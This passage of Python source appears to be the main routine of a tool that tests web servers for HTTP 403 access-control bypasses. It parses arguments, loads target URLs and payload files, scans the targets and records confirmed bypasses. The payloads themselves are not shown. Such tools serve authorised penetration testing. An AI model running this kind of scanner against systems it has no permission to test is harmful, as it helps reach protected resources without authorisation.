def parse_args():
    parser = argparse.ArgumentParser(
        description=f"{TOOL_NAME} v{VERSION} — Accuracy-first HTTP 403 bypass tester",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument("-u", "--url", help="Single target URL")
    target_group.add_argument("-l", "--list", help="File containing target URLs (one per line)")

    parser.add_argument("-p", "--payloads", default="403_url_payloads.txt",
                         help="URL payload file (default: 403_url_payloads.txt)")
    parser.add_argument("--headers-file", default="403_header_payloads.txt",
                         help="Header payload file (default: 403_header_payloads.txt)")
    parser.add_argument("-o", "--output", default="results.txt",
                         help="Output file for confirmed bypasses (default: results.txt)")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS,
                         help=f"Number of threads (default: {DEFAULT_THREADS})")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
                         help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                         help=f"Delay between requests in seconds (default: {DEFAULT_DELAY})")
    parser.add_argument("--no-verify", action="store_true",
                         help="Disable SSL certificate verification")
    parser.add_argument("--no-url", action="store_true", help="Skip URL payload tests")
    parser.add_argument("--no-headers", action="store_true", help="Skip header payload tests")
    parser.add_argument("--combine", action="store_true",
                         help="Also test URL payload + header payload combinations (slower)")

    return parser.parse_args()


# ──────────────────────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────────────────────
def main():
    print_banner()
    args = parse_args()

    # ── Resolve targets ──
    targets = []
    if args.url:
        targets = [args.url]
    elif args.list:
        if not os.path.isfile(args.list):
            log(f"[red][-] List file not found: {args.list}[/red]")
            sys.exit(1)
        with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
            targets = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
        if not targets:
            log(f"[red][-] No URLs found in {args.list}[/red]")
            sys.exit(1)
    else:
        console.print("[cyan][1][/cyan] Single URL")
        console.print("[cyan][2][/cyan] URL List")
        choice = input(f"{Fore.CYAN}Select mode: {Style.RESET_ALL}").strip()

        if choice == "1":
            raw = input(f"{Fore.CYAN}Target URL: {Style.RESET_ALL}").strip()
            if not raw:
                log("[red][-] No URL provided. Exiting.[/red]")
                sys.exit(1)
            targets = [raw]
        elif choice == "2":
            fpath = input(f"{Fore.CYAN}Path to URL list file: {Style.RESET_ALL}").strip()
            if not os.path.isfile(fpath):
                log(f"[red][-] File not found: {fpath}[/red]")
                sys.exit(1)
            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                targets = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
        else:
            log("[red][-] Invalid choice. Exiting.[/red]")
            sys.exit(1)

    # ── Load payloads ──
    url_payloads = load_payloads(args.payloads, DEFAULT_URL_PAYLOADS)
    header_pairs = load_headers(args.headers_file, DEFAULT_HEADER_PAYLOADS)

    log(f"[cyan][i] Targets         : {len(targets)}[/cyan]")
    log(f"[cyan][i] URL payloads    : {len(url_payloads)}[/cyan]")
    log(f"[cyan][i] Header payloads : {len(header_pairs)}[/cyan]")
    log(f"[cyan][i] Threads         : {args.threads}[/cyan]")
    log(f"[cyan][i] Combine mode    : {args.combine}[/cyan]")
    log(f"[cyan][i] Output file     : {args.output}\n[/cyan]")

    # Initialize/clear output file with header note
    try:
        with open(args.output, "a", encoding="utf-8") as f:
            f.write(f"\n# Scan started {datetime.now().isoformat()}\n")
    except Exception as e:
        log(f"[red][-] Cannot write to {args.output}: {e}[/red]")
        sys.exit(1)

    stats = Stats()
    start_time = time.time()
    all_findings = []

    # Initialize/clear results.json
    try:
        with open("results.json", "w", encoding="utf-8") as jf:
            jf.write("")
    except Exception:
        pass

    for i, target in enumerate(targets):
        try:
            findings = scan_target(target, url_payloads, header_pairs, args, stats, args.output, ua_index=i)
            if findings:
                for r in findings:
                    save_json_result(r, "results.json")
                all_findings.extend(findings)
        except KeyboardInterrupt:
            log("[yellow][!] Interrupted by user.[/yellow]")
            break
        except Exception as e:
            log(f"[red][-] Unexpected error scanning {target}: {e}[/red]")
            stats.incr("errors")

    elapsed = time.time() - start_time
    print_statistics(stats, elapsed)
    log(f"[green][✔] Confirmed bypasses saved to: {args.output} and results.json[/green]")

    # Print final results table
    if all_findings:
        table = Table(title="Findings", show_lines=False)
        table.add_column("URL", overflow="fold")
        table.add_column("Code", style="white")
        table.add_column("Similarity", style="cyan")
        table.add_column("Classification", style="magenta")

        for r in all_findings:
            table.add_row(r.url, str(r.status_code or "-"), f"{r.similarity:.0%}", map_classification_to_label(r))

        console.print(table)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Scan interrupted by user. Exiting.[/yellow]")
        sys.exit(130)
